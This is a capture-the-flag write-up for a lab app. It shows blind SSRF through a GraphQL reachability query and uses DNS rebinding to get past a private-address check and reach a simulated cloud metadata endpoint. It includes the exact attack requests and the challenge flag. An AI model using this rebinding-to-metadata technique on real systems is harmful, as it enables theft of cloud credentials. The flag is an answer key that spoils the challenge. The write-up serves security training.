# Nexora organizer writeup

## 1–5. Reconnaissance and URL functionality

Register a normal account, sign in, and enumerate the application’s documented REST routes and GraphQL endpoint. GraphQL introspection exposes `UrlReachable(url: String!): Reachability!`, alongside normal user, integration, webhook, and activity operations. Its name is a useful indication that it answers a reachability question rather than returning a fetched response.

```http
POST /graphql
Authorization: Bearer <token>
Content-Type: application/json

{"query":"query UrlReachableVerifierQuery($url:String!){ UrlReachable(url:$url){ reachable } }","variables":{"url":"http://probe.oast.ctf/hello"}}
```

## 6–8. Local OAST and blind confirmation

The local dashboard at `http://localhost:8081` records the resulting DNS interaction for `probe.oast.ctf` and an HTTP interaction such as `GET /hello`. This establishes that Nexora performed a server-side request while the GraphQL response contains only a boolean:

```json
{"data":{"UrlReachable":{"reachable":true}}}
```

The integration validator and webhook test make the same class of request, but the reachability query is the relevant oracle.

## 9–11. Internal reconnaissance and direct blocking

The challenge DNS service has internal names including `internal.ctf`, `internal-api.ctf`, `admin.ctf`, `metrics.ctf`, and `metadata.google.internal`. The first group exposes ordinary internal `/health`, `/status`, `/info`, `/version`, and `/metrics` endpoints. Direct requests to them (or direct private and link-local IP URLs) return `reachable: false`: the application resolves the hostname before connecting and refuses private Docker ranges, loopback, and link-local addresses.

The metadata simulator implements realistic paths under `/computeMetadata/v1/`, including instance and project keys. It does not need the real metadata header and contains no real credentials. It is only an internal target in an isolated Docker network.

## 12–16. Resolution analysis and deterministic rebinding

The DNS service intentionally answers each `rebind.ctf` lookup in an alternating, deterministic sequence. Its first answer is the documentation-safe public address `198.51.100.10`; its second answer is the metadata container `172.28.0.10`. The validator and HTTP client deliberately perform independent DNS resolutions. The validator checks only its first result. The HTTP client does not pin that result; its custom lookup calls the same DNS service again.

This is not a timing race: reset the stack, then make the request below as the first `rebind.ctf` resolution. If testing consumed a lookup, reset Docker volumes/containers to restore the counter.

```http
POST /graphql
Authorization: Bearer <token>
Content-Type: application/json

{"query":"query UrlReachableVerifierQuery($url:String!){ UrlReachable(url:$url){ reachable flag } }","variables":{"url":"http://rebind.ctf/computeMetadata/v1/"}}
```

## 17–19. Completion

Validation observes `198.51.100.10` and accepts the URL. The connection lookup observes `172.28.0.10`, so Docker routes it to the fake metadata service. The HTTP request succeeds, the oracle returns `reachable: true`, and only that successful `rebind.ctf` condition adds the flag field:

```json
{"data":{"UrlReachable":{"reachable":true,"flag":"duck{SSRF_in_GraphQL}"}}}
```

## Docker architecture

Only web (8080) and OAST (8081) are published. DNS, internal, and metadata have fixed addresses on the isolated `ctfnet` Docker network and have no host ports. The web service sends explicit DNS queries to the DNS container; the DNS container posts OAST DNS events to its local peer. This design keeps every request and simulated cloud component offline.
